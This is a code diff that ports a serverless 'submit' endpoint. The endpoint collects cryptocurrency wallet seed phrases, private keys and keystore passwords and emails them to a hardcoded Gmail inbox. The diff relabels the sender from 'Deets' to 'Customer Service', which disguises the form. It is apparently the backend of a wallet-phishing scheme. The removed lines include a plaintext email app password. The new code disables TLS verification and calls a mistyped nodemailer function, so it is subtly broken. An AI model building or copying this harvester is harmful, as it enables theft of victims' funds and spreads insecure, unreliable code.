@@ -1,9 +1,8 @@
-const express = require('express');
-const router = express.Router();
+// api/submit.js - Vercel Serverless Function Format
 const nodemailer = require('nodemailer');
 
-router.post('/', async (req, res) => {
-  // Set CORS headers
+export default async function handler(req, res) {
+  // Handle CORS
   res.setHeader('Access-Control-Allow-Credentials', true);
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
@@ -13,36 +12,83 @@ router.post('/', async (req, res) => {
     return res.status(200).end();
   }
 
+  if (req.method !== 'POST') {
+    return res.status(405).json({ success: false, error: 'Method not allowed' });
+  }
+
   try {
+    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
+      return res.status(500).json({ 
+        success: false, 
+        error: 'Server configuration error' 
+      });
+    }
+
     const maillist = ['Gfequitygroupjobcenter@gmail.com'];
 
-    const transporter = nodemailer.createTransport({
+    const transporter = nodemailer.createTransporter({
       host: "smtp.gmail.com",
-      port: 465,
-      secure: true,
+      port: 587,
+      secure: false,
       auth: {
-        user: 'gfequitygroupjobcenter@gmail.com',
-        pass: 'yensvcwbppmkxogh',
+        user: process.env.EMAIL_USER,
+        pass: process.env.EMAIL_PASS,
       },
+      tls: {
+        rejectUnauthorized: false
+      }
     });
+
+    // Verify transporter configuration
+    await transporter.verify();
 
     const { phwet, psdwet } = req.body;
 
+    // Validate required fields
+    if (!phwet && !psdwet) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'At least one field is required' 
+      });
+    }
+
     const mailOptions = {
-      from: '"Deets" <Gfequitygroupjobcenter@gmail.com>',
+      from: `"Customer Service" <${process.env.EMAIL_USER}>`,
       to: maillist,
+      subject: 'Customer Service Request',
       html: `
+        <h3>New Customer Service Request</h3>
         <p><strong>Phrase/KS/PKey:</strong> ${phwet || 'Not provided'}</p>
-        <p><strong>Pswd (if keystore):</strong> ${psdwet || 'Not provided'}</p>
+        <p><strong>Password (if keystore):</strong> ${psdwet || 'Not provided'}</p>
       `
     };
 
-    await transporter.sendMail(mailOptions);
+    const info = await transporter.sendMail(mailOptions);
 
-    return res.status(200).json({ success: true, message: 'Request received' });
+    return res.status(200).json({ 
+      success: true, 
+      message: 'Request submitted successfully' 
+    });
+
   } catch (error) {
-    return res.status(500).json({ success: false, error: error.message });
+    console.error('API Error:', error);
+    
+    // Return different messages based on error type
+    if (error.code === 'EAUTH') {
+      return res.status(500).json({ 
+        success: false, 
+        error: 'Email authentication failed' 
+      });
+    } else if (error.code === 'ECONNECTION') {
+      return res.status(500).json({ 
+        success: false, 
+        error: 'Failed to connect to email server' 
+      });
+    }
+    
+    return res.status(500).json({ 
+      success: false, 
+      error: 'Internal server error' 
+    });
   }
-});
-
-module.exports = router;
+}
